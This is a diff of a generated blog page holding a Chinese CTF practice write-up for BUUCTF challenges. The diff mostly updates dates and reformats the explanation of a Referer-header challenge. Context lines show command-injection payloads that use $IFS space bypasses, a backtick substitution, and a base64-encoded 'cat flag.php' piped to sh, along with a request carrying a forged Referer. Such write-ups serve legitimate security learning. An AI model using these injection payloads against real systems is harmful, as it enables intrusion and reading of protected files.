@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://harbeter.github.io/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220212185644770.png">
 <meta property="og:image" content="https://harbeter.github.io/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220212192414635.png">
 <meta property="article:published_time" content="2022-02-04T07:40:38.349Z">
-<meta property="article:modified_time" content="2022-02-12T12:48:56.530Z">
+<meta property="article:modified_time" content="2022-03-15T13:53:30.830Z">
 <meta property="article:author" content="Harbeter">
 <meta property="article:tag" content="刷题">
 <meta name="twitter:card" content="summary">
@@ -220,7 +220,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-12 20:48:56" itemprop="dateModified" datetime="2022-02-12T20:48:56+08:00">2022-02-12</time>
+                <time title="修改时间：2022-03-15 21:53:30" itemprop="dateModified" datetime="2022-03-15T21:53:30+08:00">2022-03-15</time>
               </span>
 
           
@@ -265,7 +265,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方法一：我们构造/?ip=1;a=g;cat$IFS$1fla$a.php然后在注释里面得到flag</span><br><span class="line">方法二：cat$IFS$9`ls`,这里的反引号是内联，所谓内联，就是将反引号内命令的输出作为输入执行。</span><br><span class="line">方法三：echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh这句是先输出cat flag.php的base64编码，然后再解码，然后再执行。其中的|表示将前一个命令的输出作为后一个命令的输入。</span><br></pre></td></tr></table></figure>
 
 <h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>进入题目后检查源码发现Secret.php文件，进入后查看源码未发现任何东西，而且给出的网址进不去。根据提示</p>
-<p>**It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn&/#39;**%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E4%B8%8D%E6%98%AF%E6%9D%A5%E6%BA%90%E4%BA%8Ehttps://Sycsecret.buuoj.cn%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFReferer%E4%B8%8D%E6%98%AFhttps://Sycsecret.buuoj.cn%E3%80%82%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E4%BF%AE%E6%94%B9header%E5%A4%B4%EF%BC%8C%E6%B7%BB%E5%8A%A0[Referer](https://blog.csdn.net/shenqueying/article/details/79426884)%EF%BC%8C%E8%BF%99%E9%87%8C%E7%94%A8Bp%E4%BF%AE%E6%94%B9%E3%80%82">https://Sycsecret.buuoj.cn&#39;**意思就是不是来源于https://Sycsecret.buuoj.cn的资源，也就是Referer不是https://Sycsecret.buuoj.cn。所以我们要修改header头，添加[Referer](https://blog.csdn.net/shenqueying/article/details/79426884)，这里用Bp修改。</a></p>
+<p>It doesn’t come from ‘<code>https://Sycsecret.buuoj.cn</code>‘意思就是不是来源于<code>https://Sycsecret.buuoj.cn</code>的资源，也就是Referer不是<code>https://Sycsecret.buuoj.cn</code>。所以我们要修改header头，添加<a target="_blank" rel="noopener" href="https://blog.csdn.net/shenqueying/article/details/79426884">Referer</a>，这里用Bp修改。</p>
 <p><code>Referer:https://Sycsecret.buuoj.cn</code></p>
 <p>Request为</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28174</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d26e27951337-0f7088736cbf9a-b7a1438-144000-17d26e27952da6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -420,7 +420,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-count">42</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
